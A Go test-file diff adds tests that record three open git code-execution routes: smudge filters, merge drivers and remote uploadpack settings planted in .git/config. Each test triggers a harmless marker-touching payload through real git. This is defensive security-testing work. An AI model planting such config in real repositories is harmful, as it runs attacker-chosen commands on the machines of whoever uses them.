@@ -1,6 +1,9 @@
 package githarden
 
 import (
+	"os"
+	"os/exec"
+	"path/filepath"
 	"slices"
 	"strings"
 	"testing"
@@ -161,5 +164,186 @@ func TestArgs_CredentialHelperResetPrecedesTheCallersOwn(t *testing.T) {
 	}
 	if resetAt > oursAt {
 		t.Errorf("the reset is at %d and the caller's helper at %d: the reset must come FIRST, or it discards Narvi's own helper and leaves the repository's", resetAt, oursAt)
+	}
+}
+
+// -- the three command classes this package does NOT close ----------------
+//
+// The tests below are the unusual kind: they assert that an attack SUCCEEDS.
+// That is deliberate, and it is this file's whole remaining contribution on
+// the subject.
+//
+// A mitigation was tried here and withdrawn -- see githarden.go's own doc
+// comment for the measurement that condemned it. What replaces it is not a
+// weaker guard but an executable record: three tests that run REAL git and
+// observe a repository-selected command actually execute, exactly the way
+// sandbox-agent's own later invocations would let it. A comment claiming
+// "this class is open" rots the moment someone reads it and assumes it was
+// fixed since. A test that goes red when the class finally closes cannot.
+//
+// So when the structural remedy lands -- sandbox-agent no longer running git
+// against a .git the runtime owns -- these tests SHOULD start failing. That
+// failure is the signal to delete them, not to repair them.
+//
+// Each one plants only what the sandbox runtime can plant with its own
+// ordinary, unprivileged powers: the config half in .git/config, which
+// §30.5 hands it, plus (for the first two) a committed .gitattributes,
+// which any repository ships.
+
+// gitEnv is os.Environ plus a fixed identity. EVERY git command this file
+// spawns needs it, not only the committing ones: a merge writes a commit
+// too, and a developer machine's own global identity would silently supply
+// it while a CI container has none -- so a command that omits this passes
+// locally and fails remotely for a reason that has nothing to do with what
+// the test is about.
+func gitEnv() []string {
+	return append(os.Environ(),
+		"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.invalid",
+		"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.invalid",
+	)
+}
+
+// gitInRepo runs git in dir with a fixed identity, failing the test on error.
+func gitInRepo(t *testing.T, dir string, args ...string) {
+	t.Helper()
+	cmd := exec.Command("git", args...)
+	cmd.Dir = dir
+	cmd.Env = gitEnv()
+	if out, err := cmd.CombinedOutput(); err != nil {
+		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
+	}
+}
+
+// newAttackRepo builds a repository whose .git/config the "runtime" owns,
+// and returns its path plus the marker path a planted command touches.
+func newAttackRepo(t *testing.T) (repoDir, marker string) {
+	t.Helper()
+	repoDir = t.TempDir()
+	marker = filepath.Join(t.TempDir(), "EXECUTED")
+	gitInRepo(t, repoDir, "init", "-q", ".")
+	return repoDir, marker
+}
+
+// payload returns a shell command that touches marker and then behaves.
+func payload(marker, passthrough string) string {
+	return "touch " + marker + "; " + passthrough
+}
+
+// TestOpenClass_ContentFilterExecutes is class (1): filter.<driver>.smudge.
+//
+// The driver NAME is chosen by the repository's own .gitattributes, so there
+// is no fixed config key a -c flag could reset -- which is why hardeningFlags
+// cannot cover it the way it covers core.hooksPath.
+func TestOpenClass_ContentFilterExecutes(t *testing.T) {
+	repoDir, marker := newAttackRepo(t)
+
+	if err := os.WriteFile(filepath.Join(repoDir, ".gitattributes"), []byte("victim.txt filter=evil\n"), 0o644); err != nil {
+		t.Fatalf("write .gitattributes: %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(repoDir, "victim.txt"), []byte("content\n"), 0o644); err != nil {
+		t.Fatalf("write victim: %v", err)
+	}
+	gitInRepo(t, repoDir, "add", "-A")
+	gitInRepo(t, repoDir, "commit", "-qm", "seed")
+
+	// The config half: an ordinary unprivileged write for the runtime.
+	gitInRepo(t, repoDir, "config", "filter.evil.smudge", payload(marker, "cat"))
+
+	if err := os.Remove(filepath.Join(repoDir, "victim.txt")); err != nil {
+		t.Fatalf("remove victim: %v", err)
+	}
+	// A checkout is what SyncAll and CleanForImageBuild both perform.
+	gitInRepo(t, repoDir, append(Args(repoDir), "checkout", "--", "victim.txt")...)
+
+	if _, err := os.Stat(marker); err != nil {
+		t.Fatalf("the armed smudge filter did NOT run (marker %s absent: %v) -- if this now passes because the class was closed, delete this test rather than repairing it", marker, err)
+	}
+}
+
+// TestOpenClass_MergeDriverExecutes is class (2): merge.<driver>.driver.
+//
+// Same shape as (1) with a different attribute, and notably NOT covered by an
+// attributes override that unsets only `filter`. It fires during the
+// `stash pop --index` gitclone's own syncOne performs.
+func TestOpenClass_MergeDriverExecutes(t *testing.T) {
+	repoDir, marker := newAttackRepo(t)
+
+	if err := os.WriteFile(filepath.Join(repoDir, ".gitattributes"), []byte("f.txt merge=evil\n"), 0o644); err != nil {
+		t.Fatalf("write .gitattributes: %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(repoDir, "f.txt"), []byte("base\n"), 0o644); err != nil {
+		t.Fatalf("write f: %v", err)
+	}
+	gitInRepo(t, repoDir, "add", "-A")
+	gitInRepo(t, repoDir, "commit", "-qm", "seed")
+
+	gitInRepo(t, repoDir, "config", "merge.evil.driver", payload(marker, "true"))
+
+	// Diverge the same path on two branches so a real three-way merge runs.
+	gitInRepo(t, repoDir, "checkout", "-q", "-b", "theirs")
+	if err := os.WriteFile(filepath.Join(repoDir, "f.txt"), []byte("theirs\n"), 0o644); err != nil {
+		t.Fatalf("write theirs: %v", err)
+	}
+	gitInRepo(t, repoDir, "commit", "-qam", "theirs")
+	gitInRepo(t, repoDir, "checkout", "-q", "-")
+	if err := os.WriteFile(filepath.Join(repoDir, "f.txt"), []byte("ours\n"), 0o644); err != nil {
+		t.Fatalf("write ours: %v", err)
+	}
+	gitInRepo(t, repoDir, "commit", "-qam", "ours")
+
+	// The merge is allowed to report a conflict -- only the driver having
+	// RUN is what this test observes. But its output is captured and
+	// reported on failure: a merge that never happened (a git that refused
+	// the repository, a branch name this fixture guessed wrong) would
+	// otherwise look identical to a driver that did not fire, and this test
+	// would blame the wrong thing.
+	merge := exec.Command("git", append(Args(repoDir), "merge", "theirs")...)
+	merge.Dir = repoDir
+	merge.Env = gitEnv()
+	mergeOut, mergeErr := merge.CombinedOutput()
+
+	// Precondition: git must actually have attempted a three-way merge of
+	// the armed path. If it fast-forwarded or refused outright, the driver
+	// was never reachable and the run proves nothing either way.
+	if !strings.Contains(string(mergeOut), "f.txt") {
+		t.Fatalf("precondition failed: git never attempted a three-way merge of the armed path.\ngit merge said: %v\n%s", mergeErr, mergeOut)
+	}
+
+	if _, err := os.Stat(marker); err != nil {
+		t.Fatalf("the armed merge driver did NOT run (marker %s absent: %v)\ngit merge said: %v\n%s\n-- if this now passes because the class was closed, delete this test rather than repairing it", marker, err, mergeErr, mergeOut)
+	}
+}
+
+// TestOpenClass_UploadPackExecutes is class (3), and the decisive one:
+// remote.<name>.uploadpack has NO .gitattributes half at all.
+//
+// It is pure config, consulted on a plain fetch, so no attributes file --
+// however privileged, however early -- could ever have reached it. This is
+// what makes "write an override into .git/info/attributes" unsound as a
+// strategy rather than merely as an implementation.
+func TestOpenClass_UploadPackExecutes(t *testing.T) {
+	srcDir := t.TempDir()
+	gitInRepo(t, srcDir, "init", "-q", ".")
+	if err := os.WriteFile(filepath.Join(srcDir, "a.txt"), []byte("x\n"), 0o644); err != nil {
+		t.Fatalf("write a: %v", err)
+	}
+	gitInRepo(t, srcDir, "add", "-A")
+	gitInRepo(t, srcDir, "commit", "-qm", "seed")
+
+	cloneParent := t.TempDir()
+	gitInRepo(t, cloneParent, "clone", "-q", srcDir, "clone")
+	repoDir := filepath.Join(cloneParent, "clone")
+	marker := filepath.Join(t.TempDir(), "EXECUTED")
+
+	// No .gitattributes anywhere -- the config half is the whole attack.
+	gitInRepo(t, repoDir, "config", "remote.origin.uploadpack", payload(marker, "git-upload-pack"))
+
+	fetch := exec.Command("git", append(Args(repoDir), "fetch", "origin")...)
+	fetch.Dir = repoDir
+	fetch.Env = gitEnv()
+	fetchOut, fetchErr := fetch.CombinedOutput()
+
+	if _, err := os.Stat(marker); err != nil {
+		t.Fatalf("the armed uploadpack command did NOT run (marker %s absent: %v)\ngit fetch said: %v\n%s\n-- if this now passes because the class was closed, delete this test rather than repairing it", marker, err, fetchErr, fetchOut)
 	}
 }
